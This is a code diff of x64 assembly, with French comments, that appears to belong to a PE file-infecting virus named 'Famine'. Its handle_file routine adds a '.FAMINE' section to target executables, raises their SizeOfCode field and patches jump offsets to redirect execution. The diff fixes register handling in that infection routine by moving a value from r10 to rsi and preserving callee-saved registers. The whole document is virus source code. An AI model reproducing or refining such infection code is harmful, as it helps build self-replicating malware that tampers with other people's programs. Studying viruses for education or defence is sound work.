@@ -120,7 +120,7 @@ SECTION_NAME db '.FAMINE',0
 ; rsp
 
 ; rdi : Fin de la ft
-; r10d : VA de Famine dans le fichier distant
+; esi : VA de Famine dans le fichier distant
 ; r12 : handle
 ; r13 : fileSize
 ; r14 : taille de notre code
@@ -129,13 +129,19 @@ SECTION_NAME db '.FAMINE',0
 handle_file proc ; int handle
 	push rbp
 	mov rbp, rsp
+	push rbx
+	push rsi
+	push r12
+	push r13
+	push r14
+	push r15
 	sub rsp, 96
 
 	mov qword ptr [rsp + 64], rdi
 
-
 	mov r12, rcx
-	mov rcx, r12
+
+	; first parameter already in rcx
 	mov rdx, 0 
 
 	test BYTE ptr [MUST_EXIT], 1
@@ -256,8 +262,8 @@ end_read_file:
 	inc r8d
 	mov dword ptr [rsp + 56], r8d
 	mov dword ptr [rax], r8d ; On met son endroit dans la memoire virtuelle
-	xor r10, r10
-	mov r10d, r8d
+	xor rsi, rsi
+	mov esi, r8d
 
 	add rax, 4
 	mov rbx, r14
@@ -302,7 +308,7 @@ end_read_file:
 		inc rbx
 	add dword ptr [r15], ebx ; On  augment le champ SizeOfcode du pe
 
-	mov qword ptr [rsp + 72], r10
+	mov qword ptr [rsp + 72], rsi
 
 	add r15, 12
 	xor rbx, rbx
@@ -312,7 +318,7 @@ end_read_file:
 
 	mov qword ptr [rsp + 80], rbx
 
-	mov r10, qword ptr [rsp + 72]
+	mov rsi, qword ptr [rsp + 72]
 
 	mov rax, debut_main
 	mov rbx, label_debut
@@ -340,7 +346,7 @@ end_read_file:
 	add rbx, 4 ; rbx = instruction apres le jump dans le heapalloc
 	sub rbx, r13
 	sub rbx, qword ptr [rsp + 40] ; rbx = offset d'apres le jump (offet debut)
-	add ebx, r10d ; ebx = rva debut
+	add ebx, esi ; ebx = rva debut
 	sub edi, ebx
 
 	mov rcx, 0
@@ -358,7 +364,7 @@ debut_boucle_ecriture_dans_jump:
 	lea rbx, label_avant_jump
 	add rbx, 5
 	sub rbx, rdx
-	add ebx, r10d
+	add ebx, esi
 
 	mov rcx, qword ptr [rsp + 80]
 	sub ecx, ebx
@@ -424,6 +430,14 @@ end_write_file_2:
 
 ret_failure:
 	mov rdi, qword ptr [rsp + 64]
+
+	pop r15
+	pop r14
+	pop r13
+	pop r12
+	pop rsi
+	pop rbx
+
 	mov rsp, rbp
 	pop rbp
 	ret
